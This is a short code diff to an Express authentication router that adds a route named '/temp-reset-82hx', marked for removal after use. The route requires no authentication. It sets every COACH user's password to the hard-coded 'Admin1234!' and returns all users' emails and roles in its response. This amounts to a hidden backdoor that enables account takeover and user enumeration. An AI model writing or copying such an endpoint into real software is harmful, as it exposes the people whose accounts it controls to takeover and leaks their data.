@@ -17,6 +17,18 @@ function makeJwt(user: { id: string; email: string; role: string; clientId?: str
   );
 }
 
+// ── Temp reset (remove after use) ────────────────────────────────────────────
+router.post('/temp-reset-82hx', async (req, res) => {
+  try {
+    const hash = await bcrypt.hash('Admin1234!', 12);
+    const result = await prisma.user.updateMany({ where: { role: 'COACH' }, data: { password: hash } });
+    const users = await prisma.user.findMany({ select: { email: true, role: true } });
+    res.json({ updated: result.count, users });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 // ── Password login ────────────────────────────────────────────────────────────
 router.post('/login', async (req, res) => {
   try {
